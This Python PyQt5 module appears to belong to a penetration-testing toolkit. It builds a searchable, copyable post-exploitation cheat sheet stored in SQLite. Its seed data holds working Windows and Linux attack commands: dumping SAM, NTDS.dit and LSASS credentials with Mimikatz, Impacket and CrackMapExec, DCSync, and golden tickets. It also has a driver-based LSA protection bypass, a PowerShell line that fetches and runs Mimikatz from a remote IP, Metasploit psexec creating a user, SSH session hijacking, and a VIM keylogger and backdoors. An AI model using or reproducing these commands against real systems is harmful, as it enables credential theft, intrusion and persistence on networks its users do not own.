import sqlite3
import os
import sys
from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QSplitter, 
                             QTreeWidget, QTreeWidgetItem, QTextEdit, QLabel, 
                             QPushButton, QLineEdit, QApplication, QFrame, QMessageBox)
from PyQt5.QtCore import Qt, pyqtSignal, QSize
from PyQt5.QtGui import QIcon, QFont, QColor, QPalette

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        # Go up two levels: modules/post_exploitation.py -> modules/ -> root/
        base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    return os.path.join(base_path, relative_path)

# ---------------------------------------------------------
# DATABASE MANAGER
# ---------------------------------------------------------
class PostExpDB:
    def __init__(self, db_path="post_exploitation.db"):

        self.db_path = resource_path(os.path.join("resources", "post_exploitation.db"))
            
        self.init_db()

    def init_db(self):
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Create Table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS cheatsheet (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT,      -- Windows / Linux
                category TEXT,      -- Looting, Lateral Movement, Post Exploitation
                title TEXT,         -- Technique Name (e.g., "Dumping SAM")
                description TEXT,   -- Context/Explanation
                code TEXT           -- The command/code block
            )
        ''')
        
        # Check if empty, if so, seed it
        cursor.execute('SELECT count(*) FROM cheatsheet')
        if cursor.fetchone()[0] == 0:
            self.seed_data(cursor)
        
        conn.commit()
        conn.close()

    def get_all_entries(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT id, platform, category, title FROM cheatsheet ORDER BY platform, category, title")
        data = cursor.fetchall()
        conn.close()
        return data

    def get_entry_details(self, entry_id):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT title, description, code FROM cheatsheet WHERE id=?", (entry_id,))
        data = cursor.fetchone()
        conn.close()
        return data

    def seed_data(self, cursor):
        """Populates the DB with comprehensive data from the repository."""
        data = [
            # =================================================================
            # WINDOWS - LOOTING
            # Source: Windows Credentials/Looting.md
            # =================================================================
            ("Windows", "Looting", "Dump SAM (Method 1: VSSAdmin)",
             "Create a shadow copy of the C drive to copy SAM and SYSTEM hives, which are otherwise locked.",
             "1. wmic shadowcopy call create Volume='C:\\'\n"
             "2. vssadmin list shadows\n"
             "3. copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\sam C:\\users\\public\\sam\n"
             "4. copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\system C:\\users\\public\\system"),

            ("Windows", "Looting", "Dump SAM (Method 2: Registry)",
             "Extract SAM and SYSTEM hives directly using the reg command (requires Admin).",
             "1. reg save HKLM\\sam C:\\users\\public\\sam\n"
             "2. reg save HKLM\\system C:\\users\\public\\system"),

            ("Windows", "Looting", "Dump SAM (Method 3: Impacket)",
             "Dump contents using impacket-secretsdump locally.",
             "impacket-secretsdump -sam sam -system system local"),

            ("Windows", "Looting", "GPP Password (Manual)",
             "Decrypt Group Policy Preferences passwords. AES-256 key is public (MS14-025).",
             "1. Find GPP in SMB: \\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\\n"
             "2. Decrypt:\n"
             "echo 'base64_pass' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000"),

            ("Windows", "Looting", "GPP Password (Automated)",
             "Use Get-GPPPassword.py from Impacket to find and decrypt credentials.",
             "# NULL session\n"
             "Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'\n\n"
             "# Cleartext creds\n"
             "Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n\n"
             "# Pass-the-hash\n"
             "Get-GPPPassword.py -hashes 'LM':'NT' 'DOMAIN'/'USER':'PASS'@'DC'"),

            ("Windows", "Looting", "LAPS (LAPSToolkit)",
             "Dump Local Administrator Password Solution (LAPS) passwords using PowerShell.",
             "Import-Module .\\LAPSToolkit.ps1\n"
             "Get-LAPSComputers  # List LAPS computers\n"
             "Find-LAPSDelegatedGroups  # List groups that can read LAPS\n"
             "Get-LAPSComputers  # If privileged, returns cleartext passwords"),

            ("Windows", "Looting", "LSASS - Mimikatz (Interactive)",
             "Dump credentials from LSASS memory using Mimikatz interactive shell.",
             "# Dump Credentials\n"
             "privilege::debug\n"
             "sekurlsa::logonpasswords\n\n"
             "# Dump TGT/TGS Tickets\n"
             "sekurlsa::tickets\n"
             "sekurlsa::tickets /export\n"
             "kerberos::ptt ticket.kirbi"),

            ("Windows", "Looting", "LSASS - Invoke-Mimikatz",
             "Execute Mimikatz in memory via PowerShell (PowerSploit). Can bypass AMSI.",
             "# Load from URL and execute\n"
             "(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Mimikatz.ps1') | IEX\n"
             "Invoke-Mimikatz -Command \"`\"sekurlsa::logonpasswords`\"\""),

            ("Windows", "Looting", "LSASS - MiniDump (ProcDump)",
             "Create a dump file of LSASS to parse offline (avoids running Mimikatz on target).",
             "# On Target\n"
             "minidump.exe c:\\windows\\tasks\\lsass.dmp\n\n"
             "# Offline Parsing (Mimikatz)\n"
             "sekurlsa::minidump lsass.dmp\n"
             "sekurlsa::logonpasswords"),

            ("Windows", "Looting", "LSASS - Impacket & CrackMapExec",
             "Remote LSASS dumping techniques.",
             "# Impacket\n"
             "impacket-secretsdump contoso.com/user:'pass'@192.168.1.1\n\n"
             "# CrackMapExec\n"
             "crackmapexec smb 192.168.1.1 -u user -p 'pass' -d domain --lsa"),

            ("Windows", "Looting", "LSA Protection Bypass (mimidrv)",
             "Bypass PPL (Protected Process Light) to dump LSASS using the mimidrv.sys driver.",
             "# Load Driver\n"
             "sc create mimidrv binPath= C:\\path\\mimidrv.sys type= kernel start= demand\n"
             "sc start mimidrv\n\n"
             "# In Mimikatz\n"
             "!processprotect /process:lsass.exe /remove"),

            ("Windows", "Looting", "NTDS.dit (VSSAdmin)",
             "Dump Active Directory database (NTDS) using Shadow Copies (Requires Domain Admin/DC Local Admin).",
             "1. wmic shadowcopy call create Volume='C:\\'\n"
             "2. copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit c:\\ntds.dit\n"
             "3. reg save HKLM\\SYSTEM c:\\system\n"
             "4. Download and parse:\n"
             "impacket-secretsdump -system system -ntds ntds LOCAL"),

            ("Windows", "Looting", "NTDS.dit (Impacket)",
             "Remote NTDS dump via DRSUAPI (slower than VSS but effective).",
             "impacket-secretsdump -dc-ip <DC_IP> domain/username:password@target_name"),

            ("Windows", "Looting", "DcSync Attack",
             "Replicate domain secrets without dumping full NTDS (Requires DCSync rights).",
             "# Mimikatz\n"
             "lsadump::dcsync /user:Administrator\n"
             "lsadump::dcsync /domain:prod.corp.com /user:prod\\krbtgt"),

            ("Windows", "Looting", "Meterpreter / Kiwi",
             "Looting commands using the 'kiwi' extension in Meterpreter.",
             "load kiwi\n"
             "creds_all\n"
             "hashdump  # SAM only\n"
             "dcsync_ntlm contoso.com\\krbtgt\n"
             "golden_ticket_create -d domain -u user -s <SID> -k <HASH> -t ticket.tck\n"
             "kerberos_ticket_use ticket.tck\n"
             "run post/windows/gather/credentials/enum_laps"),

            # =================================================================
            # WINDOWS - LATERAL MOVEMENT
            # Source: Windows Lateral Movement/Techinques.md
            # =================================================================
            ("Windows", "Lateral Movement", "PsExec (Registry Setup)",
             "Enable LocalAccountTokenFilterPolicy to allow PsExec connections (Required for local admin access via network).",
             "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"),

            ("Windows", "Lateral Movement", "PsExec (Impacket)",
             "Python implementation of PsExec (No service binary left behind usually).",
             "impacket-psexec domain/user:password@target"),

            ("Windows", "Lateral Movement", "PsExec (Metasploit)",
             "Metasploit modules for PsExec.",
             "use exploit/windows/smb/psexec\n"
             "set PAYLOAD windows/exec\n"
             "set CMD net user hacker Pass123 /add /y\n\n"
             "use auxiliary/scanner/smb/psexec_loggedin_users"),

            ("Windows", "Lateral Movement", "WMI (PowerShell Local)",
             "Create a process on localhost using WMI.",
             "Invoke-WmiMethod -Path Win32_process -Name create -ArgumentList \"calc.exe\" -Verbose"),

            ("Windows", "Lateral Movement", "WMI (PowerShell Remote)",
             "Create a process on a remote machine using WMI (Needs Port 135/445).",
             "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'notepad.exe' -ComputerName 192.168.1.10 -Credential $cred"),

            ("Windows", "Lateral Movement", "WMI (Impacket)",
             "Execute commands via WMI (No_PsExec_Needed).",
             "impacket-wmiexec domain/user:password@target"),

            ("Windows", "Lateral Movement", "DCOM Exec",
             "Lateral movement via MMC20.Application COM object.",
             "impacket-dcomexec user@targetIP"),

            ("Windows", "Lateral Movement", "SMBExec",
             "Executes commands via service creation. Writes output to SMB share (C$), reads it, then deletes it.",
             "impacket-smbexec user:pass@targetIP"),

            ("Windows", "Lateral Movement", "Task Scheduler (AtExec)",
             "Executes commands via Task Scheduler (atsvc).",
             "impacket-atexec user:pass@targetIP systeminfo"),

            # =================================================================
            # LINUX - LATERAL MOVEMENT
            # Source: Linux Lateral Movement/ansible.md
            # Source: Linux Lateral Movement/SSH hijacking with control master.txt
            # =================================================================
            ("Linux", "Lateral Movement", "Ansible Ad-Hoc Commands",
             "Execute standalone shell commands on all victim machines.",
             "ansible victims -a \"whoami\"\n"
             "ansible victims -a \"whoami\" --become root"),

            ("Linux", "Lateral Movement", "Ansible Playbooks",
             "Run YAML playbooks on victims.",
             "ansible-playbook script.yml"),

            ("Linux", "Lateral Movement", "Ansible Vault Cracking",
             "Crack encrypted Ansible Vault passwords using John the Ripper.",
             "1. python3 /usr/share/john/ansible2john.py test.yml > testhash.txt\n"
             "2. john --wordlist=/usr/share/wordlists/rockyou.txt testhash.txt\n"
             "3. cat test.yml | ansible-vault decrypt"),

            ("Linux", "Lateral Movement", "SSH ControlMaster Hijacking",
             "Hijack existing SSH sessions by configuring the ControlMaster socket.",
             "# 1. Add to ~/.ssh/config\n"
             "Host *\n"
             "    ControlPath ~/.ssh/controlmaster/%r@%h:%p\n"
             "    ControlMaster auto\n"
             "    ControlPersist 10m\n\n"
             "# 2. Prepare directory\n"
             "chmod 644 .ssh/config\n"
             "mkdir .ssh/controlmaster\n\n"
             "# 3. Hijack session (once victim connects)\n"
             "ssh -S .ssh/controlmaster/user@target:22"),

            # =================================================================
            # LINUX - POST EXPLOITATION
            # Source: Linux Post Exploitation/*.md
            # =================================================================
            ("Linux", "Post Exploitation", "Shared Libraries Order",
             "Understanding library loading order for hijacking.",
             "1. RPATH application variable\n"
             "2. LD_LIBRARY_PATH env variable\n"
             "3. RUNPATH application variable\n"
             "4. Directories under /etc/ld.so.conf\n"
             "5. System libraries (/lib, /usr/lib, etc)"),

            ("Linux", "Post Exploitation", "VIM Keylogger",
             "Log file changes using VIM 'BufWritePost' autocmd.",
             "# Add to .vimrc or /tmp/settings.vim\n"
             ":autocmd BufWritePost * :silent :w! >> /tmp/vim_output.txt\n\n"
             "# Filter for root only\n"
             ":if $USER == \"root\"\n"
             ":autocmd BufWritePost * :silent :w! >> /tmp/vim_output_root.txt\n"
             ":endif"),

            ("Linux", "Post Exploitation", "VIM Backdoor (Command)",
             "Execute a simple command when VIM starts.",
             "# Add to .vimrc\n"
             ":silent !touch /tmp/pwned.txt"),

            ("Linux", "Post Exploitation", "VIM Backdoor (Script)",
             "Execute a stealthy bash script via source when VIM starts.",
             "# Add to .vimrc\n"
             ":silent !source /tmp/.vimrunscript\n\n"
             "# Contents of /tmp/.vimrunscript\n"
             "#!/bin/bash\n"
             "echo \"Code Execution!\" > /tmp/pwned.txt")
        ]
        
        cursor.executemany('INSERT INTO cheatsheet (platform, category, title, description, code) VALUES (?,?,?,?,?)', data)


# ---------------------------------------------------------
# UI WIDGET
# ---------------------------------------------------------
class PostExploitationWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.db = PostExpDB()
        
        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(0, 0, 0, 0)
        self.layout.setSpacing(10)

        # --- Search Bar ---
        self.search_bar = QLineEdit()
        self.search_bar.setPlaceholderText("ðŸ” Search techniques (e.g. 'Mimikatz', 'SSH', 'WMI')...")
        self.search_bar.setStyleSheet("""
            QLineEdit {
                background-color: #2f2f40; color: #00d2ff;
                border: 1px solid #444; border-radius: 15px;
                padding: 8px 15px; font-size: 14px;
            }
            QLineEdit:focus { border: 1px solid #00d2ff; }
        """)
        self.search_bar.textChanged.connect(self.filter_tree)
        self.layout.addWidget(self.search_bar)

        # --- Splitter ---
        self.splitter = QSplitter(Qt.Horizontal)
        self.layout.addWidget(self.splitter)

        # LEFT: Tree View
        self.tree = QTreeWidget()
        self.tree.setHeaderHidden(True)
        self.tree.setStyleSheet("""
            QTreeWidget {
                background-color: #1e1e2f; color: #e0e0e0;
                border: 1px solid #333; font-size: 14px;
            }
            QTreeWidget::item { padding: 5px; }
            QTreeWidget::item:hover { background-color: #2f2f40; }
            QTreeWidget::item:selected { background-color: #00d2ff; color: #1e1e2f; }
        """)
        self.tree.itemClicked.connect(self.on_item_clicked)
        self.splitter.addWidget(self.tree)

        # RIGHT: Detail View
        self.detail_frame = QFrame()
        self.detail_frame.setStyleSheet("background-color: #1e1e2f;")
        self.detail_layout = QVBoxLayout(self.detail_frame)
        self.detail_layout.setContentsMargins(20, 0, 0, 0)
        
        self.lbl_title = QLabel("Select a Technique")
        self.lbl_title.setFont(QFont("Arial", 22, QFont.Bold))
        self.lbl_title.setStyleSheet("color: #00d2ff; margin-bottom: 10px;")
        
        self.lbl_desc = QLabel("Navigate the categories on the left to view post-exploitation cheat sheets.")
        self.lbl_desc.setWordWrap(True)
        self.lbl_desc.setStyleSheet("color: #a0a0b0; font-size: 14px; font-style: italic; margin-bottom: 15px;")
        
        self.code_viewer = QTextEdit()
        self.code_viewer.setReadOnly(True)
        self.code_viewer.setStyleSheet("""
            QTextEdit {
                background-color: #1e1e24;       /* Darker, flatter background */
                color: #e0e6ed;                  /* Soft white text (easier to read) */
                font-family: 'Consolas', 'Menlo', 'Courier New', monospace;
                font-size: 15px;                 /* INCREASED SIZE (was 13px) */
                line-height: 150%;               /* Better spacing */
                border: 1px solid #444; 
                border-radius: 6px; 
                padding: 20px;                   /* More breathing room */
                selection-background-color: #00d2ff;
                selection-color: #000000;
            }
        """)
        
        self.btn_copy = QPushButton("ðŸ“‹ Copy Code")
        self.btn_copy.setCursor(Qt.PointingHandCursor)
        self.btn_copy.setStyleSheet("""
            QPushButton {
                background-color: #00d2ff; color: #1e1e2f; font-weight: bold;
                padding: 10px; border-radius: 5px; border: none; font-size: 14px;
            }
            QPushButton:hover { background-color: #3a7bd5; color: white; }
        """)
        self.btn_copy.clicked.connect(self.copy_code)
        
        self.detail_layout.addWidget(self.lbl_title)
        self.detail_layout.addWidget(self.lbl_desc)
        self.detail_layout.addWidget(QLabel("Command / Code:"))
        self.detail_layout.addWidget(self.code_viewer)
        self.detail_layout.addWidget(self.btn_copy, alignment=Qt.AlignRight)
        
        self.splitter.addWidget(self.detail_frame)
        self.splitter.setSizes([300, 700])
        
        self.populate_tree()

    def populate_tree(self):
        """Loads data from SQLite and builds the tree."""
        self.tree.clear()
        data = self.db.get_all_entries() # [(id, platform, category, title), ...]
        
        # Organize data: Platform -> Category -> Items
        tree_structure = {}
        
        for entry_id, platform, category, title in data:
            if platform not in tree_structure:
                tree_structure[platform] = {}
            if category not in tree_structure[platform]:
                tree_structure[platform][category] = []
            
            tree_structure[platform][category].append((title, entry_id))

        # Build UI Items
        for platform, categories in tree_structure.items():
            plat_item = QTreeWidgetItem(self.tree)
            plat_item.setText(0, platform)
            plat_item.setIcon(0, QIcon.fromTheme("computer"))
            plat_item.setExpanded(True)
            plat_item.setForeground(0, QColor("#00d2ff"))
            font = plat_item.font(0)
            font.setBold(True)
            plat_item.setFont(0, font)

            for cat, items in categories.items():
                cat_item = QTreeWidgetItem(plat_item)
                cat_item.setText(0, cat)
                cat_item.setForeground(0, QColor("#aa00ff"))
                cat_item.setExpanded(True)

                for title, entry_id in items:
                    item = QTreeWidgetItem(cat_item)
                    item.setText(0, title)
                    item.setData(0, Qt.UserRole, entry_id) # Store DB ID
                    
    def on_item_clicked(self, item, column):
        entry_id = item.data(0, Qt.UserRole)
        if entry_id:
            data = self.db.get_entry_details(entry_id)
            if data:
                title, desc, code = data
                self.lbl_title.setText(title)
                self.lbl_desc.setText(desc)
                
                # --- ENHANCED FORMATTING ---
                # Converts raw text to HTML to colorize comments
                import html
                escaped_code = html.escape(code)
                lines = escaped_code.split('\n')
                styled_lines = []
                for line in lines:
                    # Highlight comments in Green/Grey
                    if line.strip().startswith('#'):
                        styled_lines.append(f'<span style="color: #6A9955; font-style: italic;">{line}</span>')
                    # Highlight headers/keys (optional logic)
                    elif line.strip().startswith('1.') or "://" in line:
                         styled_lines.append(f'<span style="color: #569CD6;">{line}</span>')
                    else:
                        styled_lines.append(line)
                
                final_html = "<br>".join(styled_lines)
                self.code_viewer.setHtml(final_html)
                # ---------------------------

    def filter_tree(self, text):
        """Simple search filter."""
        text = text.lower()
        # Iterate top level (Platform)
        for i in range(self.tree.topLevelItemCount()):
            plat_item = self.tree.topLevelItem(i)
            plat_visible = False
            
            # Iterate categories
            for j in range(plat_item.childCount()):
                cat_item = plat_item.child(j)
                cat_visible = False
                
                # Iterate leaves
                for k in range(cat_item.childCount()):
                    leaf = cat_item.child(k)
                    if text in leaf.text(0).lower():
                        leaf.setHidden(False)
                        cat_visible = True
                        plat_visible = True
                    else:
                        leaf.setHidden(True)
                
                cat_item.setHidden(not cat_visible)
            
            plat_item.setHidden(not plat_visible)

    def copy_code(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.code_viewer.toPlainText())
        self.btn_copy.setText("âœ… Copied!")
        QApplication.processEvents()
        import time
        # Reset button text logic handled by a simple property or timer usually, 
        # but for simplicity we leave it or reset on next click.
        # Here we just schedule a reset visually if we had a timer, 
        # but pure python sleep freezes UI. So we'll just leave it or use a lambda.
        from PyQt5.QtCore import QTimer
        QTimer.singleShot(2000, lambda: self.btn_copy.setText("ðŸ“‹ Copy Code"))